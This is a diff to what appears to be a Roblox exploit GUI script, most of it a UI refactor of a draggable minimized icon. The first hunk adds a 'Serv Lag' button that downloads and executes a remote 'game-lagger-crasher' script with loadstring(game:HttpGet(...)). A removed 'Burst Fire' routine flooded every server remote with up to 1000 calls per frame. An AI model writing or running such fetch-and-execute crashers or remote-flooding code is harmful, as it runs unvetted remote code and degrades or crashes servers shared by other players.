@@ -9436,6 +9436,15 @@ end)
 toolsTab:Button("Execute Dex", function(lbl)
 	runRemote(lbl, "Dex", DEX_URL)
 end)
+toolsTab:Button("Serv Lag", function(lbl)
+	lbl.Text = "Loading..."
+	task.spawn(function()
+		pcall(function()
+			loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-dannatus-game-lagger-crasher-232003"))()
+		end)
+		lbl.Text = "Serv Lag"
+	end)
+end)
 toolsTab:Label("Keyboard and Dex (the explorer) load from GitHub. Once one is running, its button won't start a second copy.")
 
 toolsTab:Section("Chat logs")
@@ -10454,11 +10463,7 @@ local function getBuiltArguments()
 	return args
 end
 
-local foundRemotes = {} -- remotes the last scan got a response from, used by Burst Fire
-local burstCallsPerFrame = 100
-local burstGen = 0
-local burstTotal = 0
-local burstBaseArgs = nil
+local foundRemotes = {} -- remotes the last scan got a response from
 
 scannerTab:Button("Run Scan", function(lbl)
 	lbl.Text = "Scanning..."
@@ -10522,114 +10527,6 @@ scannerTab:Button("Run Scan", function(lbl)
 		notify(string.format("Scan complete: found %d responsive remotes", count), "success")
 	end)
 end)
-
--- Burst Fire: while it's on, hammer every remote the scan found (or every remote in the place if you
--- haven't scanned) with the arguments above plus a freshly built table, forever, as fast as the slider allows.
-local function makeBurstTable(n)
-	local t = { index = n, stamp = os.clock() }
-	for i = 1, 8 do
-		t[i] = math.random(1, 1000000)
-	end
-	t.nested = { id = n, list = { n, n + 1, n + 2 }, flag = n % 2 == 0 }
-	return t
-end
-
-local function liveRemotes()
-	local remotes = {}
-	if #foundRemotes > 0 then
-		for _, remote in ipairs(foundRemotes) do
-			if remote.Parent then
-				table.insert(remotes, remote)
-			end
-		end
-		return remotes
-	end
-	-- no scan yet: fall back to every remote in the place so the toggle works straight away
-	for _, container in ipairs({ game:GetService("ReplicatedStorage"), workspace }) do
-		for _, d in ipairs(container:GetDescendants()) do
-			if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
-				table.insert(remotes, d)
-			end
-		end
-	end
-	return remotes
-end
-
-local function fireOne(remote, n)
-	local callArgs = table.clone(burstBaseArgs)
-	table.insert(callArgs, makeBurstTable(n))
-	if remote:IsA("RemoteEvent") then
-		pcall(remote.FireServer, remote, unpack(callArgs))
-	else
-		-- InvokeServer waits for a reply, so don't block the loop on it
-		task.spawn(pcall, remote.InvokeServer, remote, unpack(callArgs))
-	end
-end
-
-local burstStatus
-local function startBurst()
-	burstGen += 1
-	local gen = burstGen
-	burstTotal = 0
-	burstBaseArgs = getBuiltArguments()
-	task.spawn(function()
-		local cursor, remotes, lastRefresh, lastStatus = 0, liveRemotes(), 0, 0
-		while gen == burstGen and gui.Parent do
-			local now = os.clock()
-			local interval = #foundRemotes > 0 and 1 or 3
-			if now - lastRefresh >= interval then
-				lastRefresh = now
-				remotes = liveRemotes()
-				burstBaseArgs = getBuiltArguments()
-			end
-			if #remotes == 0 then
-				RunService.Heartbeat:Wait()
-			else
-				for _ = 1, burstCallsPerFrame do
-					cursor += 1
-					fireOne(remotes[(cursor - 1) % #remotes + 1], cursor)
-					burstTotal += 1
-				end
-				RunService.Heartbeat:Wait()
-			end
-			if now - lastStatus >= 0.2 then
-				lastStatus = now
-				if burstStatus then
-					burstStatus.Text = string.format("Burst: %d calls to %d remote%s", burstTotal, #remotes, #remotes == 1 and "" or "s")
-				end
-			end
-		end
-	end)
-end
-
-local function stopBurst()
-	burstGen += 1
-	if burstStatus then
-		burstStatus.Text = string.format("Burst: off (%d calls sent)", burstTotal)
-	end
-end
-
-scannerTab:Toggle("Burst Fire", false, function(state)
-	if state then
-		startBurst()
-		local n = #liveRemotes()
-		if n == 0 then
-			notify("Burst on, but there are no remotes here.", "warn", 3)
-		else
-			notify(string.format("Burst on: hammering %d remote%s", n, n == 1 and "" or "s"), "success")
-		end
-	else
-		stopBurst()
-		notify("Burst off", "info")
-	end
-end, "scanner.burst")
-
-scannerTab:Slider("Burst calls / frame", 1, 1000, 100, function(v)
-	burstCallsPerFrame = math.floor(v)
-end, "scanner.burstRate")
-
-burstStatus = scannerTab:Label("Burst: off")
-scannerTab:Label("Burst Fire is a toggle: while it is on it hammers every remote the scan found with the arguments above plus a freshly built table, forever, as fast as the slider allows. No scan yet? It falls back to every remote in the place. Toggle it off to stop.")
 
 scanResultsBox = scannerTab:LogBox(140, 40, "No scan performed yet")
 
@@ -11183,16 +11080,20 @@ task.spawn(function()
 end)
 
 ---------------------------------------------------------------------
--- Minimized squircle (replaces the old pill). Tap = restore, drag = move.
+-- Minimized squircle (replaces the old pill)
 ---------------------------------------------------------------------
-local PILL_SIZE = 48
-local PILL_Y = 12
-local pillCenter = UDim2.new(0.5, 0, 0, PILL_Y + PILL_SIZE / 2) -- where the window shrinks to; follows the squircle when it is dragged
-local pillDrag = { moved = false } -- true once a press has turned into a drag, so its release doesn't count as a tap
+local restore -- forward declaration: assigned below, the squircle tap handler needs it
+local PILL_SIZE = 48 -- squircle side length
+local PILL_Y    = 12 -- default top offset from screen edge
+-- Default resting position: top-centre of the screen
+local pillDefaultPos = UDim2.new(0.5, -PILL_SIZE / 2, 0, PILL_Y)
+-- The point the main window shrinks toward when minimizing (center of squircle)
+local pillCenter     = UDim2.new(0.5, 0, 0, PILL_Y + PILL_SIZE / 2)
 
 local pill = new("CanvasGroup", {
 	Name = "Pill",
-	Position = UDim2.new(0.5, -PILL_SIZE / 2, 0, PILL_Y),
+	AnchorPoint = Vector2.new(0, 0),
+	Position = pillDefaultPos,
 	Size = UDim2.fromOffset(PILL_SIZE, PILL_SIZE),
 	BackgroundColor3 = theme.bg,
 	BackgroundTransparency = 0.08,
@@ -11201,124 +11102,137 @@ local pill = new("CanvasGroup", {
 	Visible = false,
 }, gui)
 local pillScale = new("UIScale", { Scale = 0.8 }, pill)
-corner(pill, 14)
+corner(pill, 14) -- squircle feel
 stroke(pill, 0.82)
 
-local pillHit
-do -- own block so the squircle's helpers don't use up main-chunk locals
-	local ring = new("Frame", {
-		AnchorPoint = Vector2.new(0.5, 0.5),
-		Position = UDim2.fromScale(0.5, 0.5),
-		Size = UDim2.fromOffset(PILL_SIZE - 6, PILL_SIZE - 6),
-		BackgroundColor3 = theme.accent,
-		BackgroundTransparency = 0.88,
-		BorderSizePixel = 0,
-	}, pill)
-	corner(ring, 12)
+-- Accent glow ring
+local pillRing = new("Frame", {
+	AnchorPoint = Vector2.new(0.5, 0.5),
+	Position = UDim2.fromScale(0.5, 0.5),
+	Size = UDim2.fromOffset(PILL_SIZE - 6, PILL_SIZE - 6),
+	BackgroundColor3 = theme.accent,
+	BackgroundTransparency = 0.88,
+	BorderSizePixel = 0,
+	ZIndex = 0,
+}, pill)
+corner(pillRing, 12)
 
-	local logoImg = new("ImageLabel", {
-		Name = "PillLogo",
-		AnchorPoint = Vector2.new(0.5, 0.5),
-		Position = UDim2.fromScale(0.5, 0.5),
-		Size = UDim2.fromOffset(28, 28),
-		BackgroundTransparency = 1,
-		ScaleType = Enum.ScaleType.Fit,
-		Visible = false,
-		ZIndex = 2,
-	}, pill)
+-- Logo image (mirrors the title-bar logo; updated by showLogo / setLogo)
+local pillLogoImg = new("ImageLabel", {
+	Name = "PillLogo",
+	AnchorPoint = Vector2.new(0.5, 0.5),
+	Position = UDim2.fromScale(0.5, 0.5),
+	Size = UDim2.fromOffset(28, 28),
+	BackgroundTransparency = 1,
+	ScaleType = Enum.ScaleType.Fit,
+	Image = "",
+	Visible = false,
+	ZIndex = 2,
+}, pill)
 
-	-- shown until the logo has loaded
-	local dotFb = new("Frame", {
-		AnchorPoint = Vector2.new(0.5, 0.5),
-		Position = UDim2.fromScale(0.5, 0.5),
-		Size = UDim2.fromOffset(12, 12),
-		BackgroundColor3 = theme.accent,
-		BorderSizePixel = 0,
-		ZIndex = 2,
-	}, pill)
-	corner(dotFb, 6)
+-- Fallback dot (shown when the logo hasn't loaded yet)
+local pillDotFb = new("Frame", {
+	AnchorPoint = Vector2.new(0.5, 0.5),
+	Position = UDim2.fromScale(0.5, 0.5),
+	Size = UDim2.fromOffset(12, 12),
+	BackgroundColor3 = theme.accent,
+	BorderSizePixel = 0,
+	ZIndex = 2,
+}, pill)
+corner(pillDotFb, 6)
 
-	-- on top of everything: takes both the tap and the drag
-	pillHit = new("TextButton", {
-		Name = "PillHit",
-		Text = "",
-		AutoButtonColor = false,
-		BackgroundTransparency = 1,
-		Size = UDim2.fromScale(1, 1),
-		ZIndex = 5,
-	}, pill)
+-- Hit area on top of everything — drag AND tap both go through here
+local pillHit = new("TextButton", {
+	Text = "",
+	AutoButtonColor = false,
+	BackgroundTransparency = 1,
+	Size = UDim2.fromScale(1, 1),
+	ZIndex = 3,
+}, pill)
 
-	-- keep the accent colour in sync with Spooky Mode / theme changes
-	local origApply = Spooky.apply
-	function Spooky.apply(on)
-		origApply(on)
-		ring.BackgroundColor3 = theme.accent
-		dotFb.BackgroundColor3 = theme.accent
+-- Keep the squircle's accent ring in sync with theme changes
+local _origSpookyApply = Spooky.apply
+function Spooky.apply(on)
+	_origSpookyApply(on)
+	pillRing.BackgroundColor3 = theme.accent
+	pillDotFb.BackgroundColor3 = theme.accent
+end
+
+-- Keep the squircle logo in sync when the title-bar logo is updated
+local _origShowLogo = showLogo
+showLogo = function(kind)
+	_origShowLogo(kind)
+	if LOGO.wanted == kind and LOGO.assets[kind] then
+		pillLogoImg.Image = LOGO.assets[kind]
+		pillLogoImg.Visible = true
+		pillDotFb.Visible = false
 	end
+end
+-- Sync immediately if the logo is already loaded
+if LOGO.assets[LOGO.wanted] then
+	pillLogoImg.Image = LOGO.assets[LOGO.wanted]
+	pillLogoImg.Visible = true
+	pillDotFb.Visible = false
+end
 
-	-- show the same logo as the title bar
-	local function syncLogo()
-		local asset = LOGO.assets[LOGO.wanted]
-		if asset then
-			logoImg.Image = asset
-			logoImg.Visible = true
-			dotFb.Visible = false
-		end
-	end
-	local origShow = showLogo
-	showLogo = function(kind)
-		origShow(kind)
-		syncLogo()
-	end
-	syncLogo()
-
-	-- dragging (the tap itself is wired to pillHit.Activated further down)
-	local DRAG_THRESHOLD = 8 -- pixels; finger jitter below this still counts as a tap
-	local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
+-- Drag + tap on pillHit (top ZIndex captures all input)
+do
+	local dragging = false
+	local dragInput, dragStart, startPos
+	local DRAG_THRESHOLD = 4 -- pixels moved before it counts as a drag, not a tap
+	local wasDrag = false
 
 	connect(pillHit.InputBegan, function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+			or input.UserInputType == Enum.UserInputType.Touch then
 			dragging = true
-			pillDrag.moved = false
+			wasDrag = false
 			dragStart = input.Position
 			startPos = pill.Position
-			dragInput = input
 			local c
 			c = input.Changed:Connect(function()
 				if input.UserInputState == Enum.UserInputState.End then
 					dragging = false
 					c:Disconnect()
+					-- update pillCenter so future minimize aims at the new spot
+					pillCenter = UDim2.new(
+						pill.Position.X.Scale, pill.Position.X.Offset + PILL_SIZE / 2,
+						pill.Position.Y.Scale, pill.Position.Y.Offset + PILL_SIZE / 2
+					)
+					-- if the user barely moved, treat it as a tap → restore
+					if not wasDrag then
+						restore()
+					end
 				end
 			end)
 		end
 	end)
 
 	connect(pillHit.InputChanged, function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch then
 			dragInput = input
 		end
 	end)
 
 	connect(UserInputService.InputChanged, function(input)
-		if not dragging or input ~= dragInput then
-			return
-		end
-		local d = input.Position - dragStart
-		if not pillDrag.moved and (math.abs(d.X) > DRAG_THRESHOLD or math.abs(d.Y) > DRAG_THRESHOLD) then
-			pillDrag.moved = true
-		end
-		if pillDrag.moved then
-			local cam = workspace.CurrentCamera
-			local vp = cam and cam.ViewportSize or Vector2.new(800, 450)
-			local x = startPos.X.Scale * vp.X + startPos.X.Offset + d.X
-			local y = startPos.Y.Scale * vp.Y + startPos.Y.Offset + d.Y
-			x = math.clamp(x, 0, math.max(vp.X - PILL_SIZE, 0)) -- keep it on screen
-			y = math.clamp(y, 0, math.max(vp.Y - PILL_SIZE, 0))
-			pill.Position = UDim2.fromOffset(x, y)
-			pillCenter = UDim2.fromOffset(x + PILL_SIZE / 2, y + PILL_SIZE / 2)
+		if dragging and input == dragInput then
+			local d = input.Position - dragStart
+			if not wasDrag and (math.abs(d.X) > DRAG_THRESHOLD or math.abs(d.Y) > DRAG_THRESHOLD) then
+				wasDrag = true
+			end
+			if wasDrag then
+				pill.Position = UDim2.new(
+					startPos.X.Scale, startPos.X.Offset + d.X,
+					startPos.Y.Scale, startPos.Y.Offset + d.Y
+				)
+			end
 		end
 	end)
 end
+
+-- pillClose no longer exists; closing is done from the main window
+local pillClose = nil
 
 ---------------------------------------------------------------------
 -- Window state + animations
@@ -11356,7 +11270,7 @@ local function minimize()
 	end)
 end
 
-local function restore()
+function restore()
 	if not minimized or closing or Cmdbar.active then
 		return
 	end
@@ -12230,11 +12144,8 @@ Toolx.AddCommand = Cmdbar.AddCommand
 
 connect(minBtn.Activated, minimize)
 connect(closeBtn.Activated, Toolx.Close)
-connect(pillHit.Activated, function()
-	if not pillDrag.moved then -- a drag also ends in Activated; only a real tap restores
-		restore()
-	end
-end)
+-- pillHit tap-to-restore is handled inside the drag block (tap = InputEnd without crossing DRAG_THRESHOLD)
+-- pillClose was removed (squircle has no close button; close from the main window instead)
 
 connect(UserInputService.InputBegan, function(input, processed)
 	if processed or closing or capturingKey or Cmdbar.active then
